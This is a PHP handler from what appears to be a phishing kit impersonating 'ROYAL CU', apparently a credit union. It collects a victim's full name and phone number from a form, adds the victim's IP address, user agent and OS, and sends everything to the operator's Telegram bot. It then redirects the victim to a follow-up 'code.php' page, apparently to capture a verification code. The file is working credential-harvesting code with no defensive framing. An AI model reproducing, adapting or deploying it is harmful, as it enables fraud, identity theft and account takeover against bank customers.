<?php
session_start();
#error_reporting(0);
# Adding Settings
include('function.php');
include('../config.php');
# User Agent 

$useragent = $_SERVER['HTTP_USER_AGENT'];
#
$subject .= "❤️== ROYAL CU DETAILS FROM {$IP} ==❤️\n\n";

$msgtg = '

*🔓Full Name  * : `'.$_POST['fllname'].'`
*🔓Phone Number  * : `'.$_POST['phonenum'].'`

*=========[ DEVICE INFO ]=========*
*IP* : http://www.geoiptool.com/?IP='.$IP.'
*Date* : '.$date.'
*USER AGENT* : '.$_SERVER['HTTP_USER_AGENT'].'
*OS / BR* : '.$os.'
';

#Send To Telegram
if ($Telegram_Logs=="yes") {
	telegramBot('sendMessage', [
	  'chat_id' => TELEGRAM_BOT_ADMIN_USERID,
	  'text' => ($subject .$msgtg),
	  'parse_mode'=>'markdown',
	  'reply_markup'=>json_encode([
      'inline_keyboard'=>[
       [['text'=>"  CODER  ", 'url'=>"https://t.me/xforgex"]],
      ]
              ])
              ]);
}
header('Location: ../code.php')
?>